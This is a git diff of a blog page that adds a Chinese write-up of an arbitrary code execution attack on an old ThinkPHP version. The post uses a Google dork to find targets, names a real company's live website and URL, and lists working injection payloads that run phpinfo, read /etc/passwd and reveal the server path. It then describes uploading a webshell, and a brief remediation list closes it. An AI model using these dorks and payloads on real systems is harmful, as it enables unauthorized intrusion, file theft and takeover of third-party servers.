@@ -128,7 +128,7 @@
 				    
 				    <li><a href="/categories/XSS/" class="animsition-link">XSS<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/code-execution/" class="animsition-link">code-execution<small>(1)</small></a></li>
+				    <li><a href="/categories/code-execution/" class="animsition-link">code-execution<small>(2)</small></a></li>
 				    
 				    <li><a href="/categories/collect-message/" class="animsition-link">collect message<small>(1)</small></a></li>
 				    
@@ -269,12 +269,18 @@
           2016-07-26
       </time>
     
+    
+    | 
+    <a href='/tags/code/'>code</a>
+    
+    
 </span>
                 <h1>任意代码执行漏洞实例1</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		
+      		<p>①．长沙绿然科技存在任意代码执行漏洞<br>0x00【漏洞概述】<br>应用在调用一些能将字符串转化伪代码的函数的时候没有考虑用户能不能控制这个字符串，就会造成任意代码注入漏洞！<br>0x01【整体思路】<br>1、谷歌语法搜索；<br>2、锁定目标，找传参的地方；<br>3、构造payload简单测试一下；<br>4、读以下文件；<br>5、获取一下当前路径；<br>6、上传一句话，拿shell.<br>0x02【漏洞演示】<br>1、Google hacking搜索语法：<br>通过google hacking强大的搜索功能，找thinkphp框架类型的网站<br>google语法：    intext:thinkphp intext:”Fast &amp; Simple OOP PHP Framework”intext:”2.1”<br>2、锁定目标网站<br><a href="http://www.natural-ex.com/" target="_blank" rel="external">http://www.natural-ex.com/</a><br>3、找传参的地方<br><a href="http://www.natural-ex.com/news_detail_cn/id/8.index.html" target="_blank" rel="external">http://www.natural-ex.com/news_detail_cn/id/8.index.html</a><br>4、进行测试<br>payload：$%7B@exit(%20phpinfo()%20)%7D<br>显示结果如下：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>显示结果证明存在代码执行漏洞！s<br>5、读文件：<br>测试一下看看能不能读文件<br>payload：{${exit(var_dump(file_get_contents($_POST[f])))}}<br> f=/etc/passwd<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"><br>6、获取当前路径<br>payload:<br>{${exit(print(getcwd()))}}<br>结果如下：<br>/data/7/5/web462257/www<br>7、上传一句话，获取webshell:<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"><br>0x03【漏洞修复】<br>1、使用josn保存数组，对象使用josn，不将对象保存成字符串；<br>2、若使用eval保证用户不能随意接触到eval的参数或者使用正则严格判断输入格式；<br>3、使用addslashe进行转义。</p>
+
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
